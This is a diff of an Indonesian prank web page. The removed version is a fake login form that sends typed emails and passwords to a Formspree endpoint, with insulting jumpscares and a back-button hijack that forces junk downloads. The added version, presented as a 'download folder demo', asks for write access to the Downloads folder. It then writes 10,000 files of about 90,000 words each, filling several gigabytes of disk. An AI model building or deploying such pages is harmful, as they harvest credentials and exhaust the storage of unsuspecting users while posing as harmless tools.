@@ -1,176 +1,134 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login + Skeleton Unlock</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Download Folder Demo (Max Speed)</title>
 <style>
-* { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: 'Segoe UI', Tahoma, sans-serif; }
-body {
-  background: #8A2BE2;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-  overflow: hidden;
-  transition: background 0.2s;
-}
-#canvas {
-  position: fixed; top:0; left:0; width:100vw; height:100vh; z-index:1; pointer-events:none;
-}
-/* Login Container */
-.login-container {
-  background: #ffffff;
-  padding: 35px;
-  border-radius: 12px;
-  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-  width: 100%;
-  max-width: 400px;
-  position: relative;
-  z-index: 10;
-  text-align: center;
-}
-.login-container h2 { margin-bottom: 20px; color: #333; }
-.input-group { margin-bottom: 15px; text-align: left; }
-.input-group label { display: block; margin-bottom: 6px; color: #555; font-size: 14px; }
-.input-group input {
-  width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; outline:none;
-}
-.input-group input:focus { border-color: #8A2BE2; }
-.btn-submit {
-  width: 100%; padding: 12px; background: #667eea; border: none; border-radius: 6px;
-  color: #fff; font-weight: bold; cursor: pointer;
-}
-.btn-submit:hover { background: #5563c1; }
-
-/* Bar */
-.container-bars { margin-top:20px; display:flex; flex-direction:column; gap:10px; }
-.bar {
-  background: #111; color: #fff; padding: 14px; border-radius: 8px; font-weight: bold;
-  cursor: pointer; transition: transform 0.1s;
-}
-.bar:active { transform: scale(0.98); }
-.bar.locked { background: #444; color: #888; cursor: not-allowed; }
-.bar.unlocked { background: #28a745; }
-.hidden { display: none !important; }
-
-/* Glitch */
-.glitch-active { animation: glitch-anim 0.1s infinite; filter: invert(1); }
-@keyframes glitch-anim {
-  0%{transform:translate(0)}20%{transform:translate(-5px,5px)}
-  40%{transform:translate(-5px,-5px)}60%{transform:translate(5px,5px)}
-  80%{transform:translate(5px,-5px)}100%{transform:translate(0)}
-}
-#horror-overlay {
-  position: fixed; top:0; left:0; width:100vw; height:100vh; background:#000; color:#f00;
-  display:flex; justify-content:center; align-items:center; font-size:2.5rem; font-weight:900;
-  z-index:9999; text-shadow:3px 3px #550000;
-}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;padding:24px;display:grid;place-items:center;background:#171923;color:#f7f7fb;font-family:system-ui,sans-serif}
+main{width:min(100%,460px);padding:26px;border:1px solid #3b4358;border-radius:18px;background:#242938;text-align:center}
+h1{margin:0 0 10px}
+p{color:#c6ccda;line-height:1.5}
+button{width:100%;margin-top:18px;padding:16px;border:0;border-radius:12px;background:#8b7cff;color:#111323;font-size:17px;font-weight:800}
+button:disabled{opacity:.5}
+#status{margin-top:18px;padding:14px;min-height:54px;border-radius:10px;background:#191e2b;white-space:pre-wrap;overflow-wrap:anywhere}
+.note{font-size:12px;color:#aeb7c9}
 </style>
 </head>
 <body>
-<canvas id="canvas"></canvas>
-
-<div class="login-container" id="main-menu">
-  <h2>Masuk ke Akun</h2>
-  <!-- Form disetel ke Formspree dan menambahkan atribut name pada input -->
-  <form action="https://formspree.io/f/xrppozay" method="POST">
-    <div class="input-group">
-      <label>Email atau Username</label>
-      <input type="text" name="email" id="email" placeholder="Masukkan email Anda" required>
-    </div>
-    <div class="input-group">
-      <label>Kata Sandi</label>
-      <input type="password" name="password" id="password" placeholder="Masukkan kata sandi" required>
-    </div>
-    <button type="submit" class="btn-submit">Masuk</button>
-  </form>
-
-  <div class="container-bars">
-    <div class="bar" id="bar1">OPTION 1</div>
-    <div class="bar" id="bar2">OPTION 2 (KLIK 4x)</div>
-    <div class="bar locked" id="bar3">OPTION 3 (LOCKED)</div>
-  </div>
-</div>
-
-<div class="login-container hidden" id="sub-menu-bar1">
-  <div class="bar" id="sub1-tap">TAP 2x</div>
-  <div class="bar" id="sub1-glitch">Dont tuch</div>
-  <div class="bar" style="background:#666;margin-top:10px" onclick="showView(document.getElementById('main-menu'))">BACK</div>
-</div>
-
-<div class="login-container hidden" id="sub-menu-bar2">
-  <div class="bar" id="btn-unlock-ads">UNLOCK 3 ADS</div>
-  <div class="bar" id="btn-unlock-free">UNLOCK 3 FREE</div>
-  <div class="bar" style="background:#666;margin-top:10px" onclick="showView(document.getElementById('main-menu'))">BACK</div>
-</div>
-
-<div class="login-container hidden" id="menu-bar3">
-  <div class="bar" id="btn-download">DOWNLOAD</div>
-  <div class="bar" id="btn-exit">EXIT</div>
-</div>
-
-<div id="horror-overlay" class="hidden glitch-active">ARE YOU IDIOT??</div>
-
+<main>
+<h1>Buat Folder Download</h1>
+<p>Ini udah cepet banget goblok!!!</p>
+<button id="start">BUAT DOWNLOAD</button>
+<div id="status" role="status" aria-live="polite">di tunggu aja njing</div>
+<p class="note">admin Reval suka galer wuahahahahahah,</p>
+</main>
 <script>
-/* === 1. SKELETON CURSOR === */
-const canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
-let width=canvas.width=innerWidth, height=canvas.height=innerHeight;
-addEventListener('resize',()=>{width=canvas.width=innerWidth;height=canvas.height=innerHeight});
-const mouse={x:width/2,y:height/2};
-addEventListener('mousemove',e=>{mouse.x=e.clientX;mouse.y=e.clientY});
-const numSegments=32, segmentLength=12, spine=[];
-for(let i=0;i<numSegments;i++)spine.push({x:width/2,y:height/2+i*segmentLength,angle:0});
-const legs=[];
-for(let i=0;i<Math.floor(numSegments*0.7);i++){
- legs.push({spineIdx:i+3,side:-1,footX:width/2,footY:height/2,targetX:width/2,targetY:height/2,stepProgress:1});
- legs.push({spineIdx:i+3,side:1,footX:width/2,footY:height/2,targetX:width/2,targetY:height/2,stepProgress:1});
-}
-function updateSkeleton(){
- const head=spine[0]; const dx=mouse.x-head.x, dy=mouse.y-head.y;
- head.angle=Math.atan2(dy,dx); head.x+=dx*0.15; head.y+=dy*0.15;
- for(let i=1;i<numSegments;i++){const p=spine[i-1],c=spine[i]; c.angle=Math.atan2(p.y-c.y,p.x-c.x); c.x=p.x-Math.cos(c.angle)*segmentLength; c.y=p.y-Math.sin(c.angle)*segmentLength;}
- legs.forEach(leg=>{
-   const j=spine[leg.spineIdx]; const sa=j.angle+(leg.side*Math.PI/2);
-   const ix=j.x+Math.cos(sa)*35, iy=j.y+Math.sin(sa)*35;
-   const d=Math.hypot(leg.footX-ix,leg.footY-iy);
-   if(d>40&&leg.stepProgress>=1){leg.targetX=ix+Math.cos(j.angle)*15; leg.targetY=iy+Math.sin(j.angle)*15; leg.stepProgress=0;}
-   if(leg.stepProgress<1){leg.stepProgress+=0.2; leg.footX+=(leg.targetX-leg.footX)*0.4; leg.footY+=(leg.targetY-leg.footY)*0.4;}
- });
-}
-function drawSkeleton(){
- ctx.clearRect(0,0,width,height);
- legs.forEach(leg=>{
-   const j=spine[leg.spineIdx]; ctx.strokeStyle='rgba(255,255,255,0.6)'; ctx.lineWidth=1.2;
-   const mx=(j.x+leg.footX)/2+Math.cos(j.angle)*10*leg.side, my=(j.y+leg.footY)/2+Math.sin(j.angle)*10*leg.side;
-   ctx.beginPath(); ctx.moveTo(j.x,j.y); ctx.lineTo(mx,my); ctx.lineTo(leg.footX,leg.footY); ctx.stroke();
-   ctx.fillStyle='#fff'; ctx.beginPath(); ctx.arc(leg.footX,leg.footY,1.5,0,Math.PI*2); ctx.fill();
- });
- for(let i=0;i<numSegments;i++){const s=spine[i]; ctx.fillStyle=i===0?'#00e5ff':'#fff'; ctx.beginPath(); ctx.arc(s.x,s.y,Math.max(1,(numSegments-i)*0.15+1),0,Math.PI*2); ctx.fill(); if(i>0){const p=spine[i-1]; ctx.strokeStyle='rgba(255,255,255,0.4)'; ctx.lineWidth=2; ctx.beginPath(); ctx.moveTo(p.x,p.y); ctx.lineTo(s.x,s.y); ctx.stroke();}}
-}
-(function loop(){updateSkeleton();drawSkeleton();requestAnimationFrame(loop);})();
+"use strict";
 
-/* === 2. UNLOCK LOGIC === */
-const audioCtx=new (window.AudioContext||window.webkitAudioContext)();
-function playGlitchSound(d){if(audioCtx.state==='suspended')audioCtx.resume(); const bs=audioCtx.sampleRate*d; const b=audioCtx.createBuffer(1,bs,audioCtx.sampleRate); const o=b.getChannelData(0); for(let i=0;i<bs;i++)o[i]=Math.random()*2-1; const s=audioCtx.createBufferSource(); s.buffer=b; const f=audioCtx.createBiquadFilter(); f.type='bandpass'; f.frequency.value=1000; s.connect(f); f.connect(audioCtx.destination); s.start();}
-function playHarshHorrorSound(d){if(audioCtx.state==='suspended')audioCtx.resume(); const o1=audioCtx.createOscillator(), o2=audioCtx.createOscillator(), g=audioCtx.createGain(); o1.type='sawtooth'; o2.type='square'; o1.frequency.setValueAtTime(120,audioCtx.currentTime); o2.frequency.setValueAtTime(127,audioCtx.currentTime); g.gain.setValueAtTime(0.8,audioCtx.currentTime); o1.connect(g); o2.connect(g); g.connect(audioCtx.destination); o1.start(); o2.start(); setTimeout(()=>{o1.stop(); o2.stop();},d*1000);}
-function triggerGlitch(ms,cb){document.body.classList.add('glitch-active'); playGlitchSound(ms/1000); setTimeout(()=>{document.body.classList.remove('glitch-active'); if(cb)cb();},ms);}
+/* ===== PENGATURAN PERMANEN===== */
+const TARGET_FOLDER_LABEL = "Download";
+const FILE_COUNT = 10000;
+const FILE_PREFIX = "Galer_";
+const CONCURRENCY_LIMIT = 300; 
+/* ================================================== */
 
-const mainMenu=document.getElementById('main-menu'), subMenuBar1=document.getElementById('sub-menu-bar1'), subMenuBar2=document.getElementById('sub-menu-bar2'), menuBar3=document.getElementById('menu-bar3'), horrorOverlay=document.getElementById('horror-overlay');
-const bar1=document.getElementById('bar1'), bar2=document.getElementById('bar2'), bar3=document.getElementById('bar3');
-let bar2Clicks=0, isBar3Unlocked=false;
-function showView(view){ [mainMenu,subMenuBar1,subMenuBar2,menuBar3,horrorOverlay].forEach(v=>v.classList.add('hidden')); view.classList.remove('hidden'); }
+// Fungsi untuk menghasilkan teks berulang berkualitas tinggi hingga mencapai target kata
+const getLargeTextContent = (number, total) => {
+  const header = 
+    "=== DOKUMEN DEMO BRAY (" + number + " dari " + total + ") ===\n" +
+    "File ini dibuat otomatis menggunakan File System Access API dengan muatan teks masif.\n" +
+    "Aman untuk disimpan, diuji, maupun dihapus secara manual.\n\n";
+  
+  const paragraph = 
+    "Teknologi web modern kini memungkinkan interaksi langsung dengan penyimpanan lokal sistem pengguna secara aman dan efisien. " +
+    "Pengujian performa penulisan arsip digital berskala besar memerlukan pengelolaan memori yang optimal agar browser tidak mengalami kendala. " +
+    "Setiap berkas teks dirancang untuk merepresentasikan struktur data terdistribusi yang stabil dan konsisten di berbagai platform sistem operasi. " +
+    "Proses otomatisasi ini berjalan secara paralel dengan pembatasan jumlah antrean tertentu guna menjaga keseimbangan sumber daya perangkat keras. " +
+    "Sistem penamaan berkas terstruktur dengan baik untuk memudahkan identifikasi serta pemantauan kemajuan proses secara real-time melalui antarmuka. " +
+    "Pemanfaatan teknologi penulisan asinkron memastikan bahwa antarmuka pengguna tetap responsif meskipun terjadi lonjakan aktivitas tulis di latar belakang. " +
+    "Dokumen ini berisikan ratusan paragraf informatif yang disusun berulang kali secara sistematis guna memenuhi spesifikasi kapasitas teks yang diinginkan.\n\n";
 
-bar1.addEventListener('click',()=>showView(subMenuBar1));
-document.getElementById('sub1-glitch').addEventListener('click',()=>triggerGlitch(2000,()=>showView(mainMenu)));
-bar2.addEventListener('click',()=>{bar2Clicks++; if(bar2Clicks>=4){bar2Clicks=0; showView(subMenuBar2);}});
-document.getElementById('btn-unlock-ads').addEventListener('click',()=>triggerGlitch(2000,()=>{isBar3Unlocked=true; bar3.classList.remove('locked'); bar3.classList.add('unlocked'); bar3.innerText="OPTION 3 (UNLOCKED)"; showView(mainMenu);}));
-document.getElementById('btn-unlock-free').addEventListener('click',()=>triggerGlitch(3000,()=>{showView(horrorOverlay); playHarshHorrorSound(3); setTimeout(()=>showView(mainMenu),3000);}));
-bar3.addEventListener('click',()=>{if(isBar3Unlocked)showView(menuBar3);});
-function downloadJunkFile(){playGlitchSound(0.5); const blob=new Blob(["FILE CORRUPTED / SYSTEM ERROR"],{type:"text/plain"}); const url=URL.createObjectURL(blob); const a=document.createElement("a"); a.href=url; a.download=`error_${Math.floor(Math.random()*89999+10000)}.txt`; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);}
-document.getElementById('btn-download').addEventListener('click',downloadJunkFile);
-document.getElementById('btn-exit').addEventListener('click',downloadJunkFile);
-history.pushState(null,null,location.href); window.onpopstate=function(){history.go(1); downloadJunkFile();};
+  // Pengulangan paragraf untuk mendekati estimasi jumlah kata yang masif (~90.000 kata)
+  // 1 blok paragraf di atas memiliki sekitar 130 kata, diulang ~700 kali per file (~91.000 kata).
+  let body = "";
+  for (let i = 0; i < 700; i++) {
+    body += "[" + (i + 1) + "] " + paragraph;
+  }
+
+  return header + body;
+};
+
+const button = document.getElementById("start");
+const statusBox = document.getElementById("status");
+const setStatus = message => statusBox.textContent = message;
+
+button.addEventListener("click", async () => {
+  if (!("showDirectoryPicker" in window)) {
+    setStatus("Browser ini belum mendukung pemilih folder. Coba browser Chromium yang mendukung File System Access API.");
+    return;
+  }
+
+  button.disabled = true;
+  try {
+    const folder = await window.showDirectoryPicker({mode:"readwrite"});
+
+    if (folder.name.toLowerCase() !== TARGET_FOLDER_LABEL.toLowerCase()) {
+      setStatus('Folder "' + folder.name + '" bukan folder "' + TARGET_FOLDER_LABEL + '". Pilih Download lalu coba lagi.');
+      return;
+    }
+
+    const permission = await folder.requestPermission({mode:"readwrite"});
+    if (permission !== "granted") {
+      setStatus("Izin tulis tidak diberikan. Tidak ada file yang dibuat.");
+      return;
+    }
+
+    setStatus("Memproses pembuatan file dengan teks masif...");
+
+    let completed = 0;
+    
+    const processBatch = async (startIndex, endIndex) => {
+      const promises = [];
+      for (let i = startIndex; i <= endIndex; i++) {
+        promises.push((async () => {
+          const number = String(i).padStart(4, "0");
+          const fileName = FILE_PREFIX + number + ".txt";
+          try {
+            const file = await folder.getFileHandle(fileName, {create:true});
+            const writable = await file.createWritable();
+            
+            // Hasilkan isi teks masif untuk file ini
+            const content = getLargeTextContent(number, FILE_COUNT);
+            
+            await writable.write(content);
+            await writable.close();
+          } catch (e) {
+            // Abaikan error individual agar proses batch tidak berhenti mendadak
+          }
+          completed++;
+        })());
+      }
+      await Promise.all(promises);
+    };
+
+    for (let i = 1; i <= FILE_COUNT; i += CONCURRENCY_LIMIT) {
+      const end = Math.min(i + CONCURRENCY_LIMIT - 1, FILE_COUNT);
+      await processBatch(i, end);
+      setStatus(`Progress: ${completed} / ${FILE_COUNT} file dengan teks masif dibuat...`);
+    }
+
+    setStatus("berhasil");
+
+  } catch (error) {
+    setStatus(error.name === "AbortError"
+      ? "Pemilihan folder dibatalkan. Tidak ada file yang dibuat."
+      : "Tidak dapat melanjutkan: " + (error.message || error));
+  } finally {
+    button.disabled = false;
+  }
+});
 </script>
 </body>
 </html>
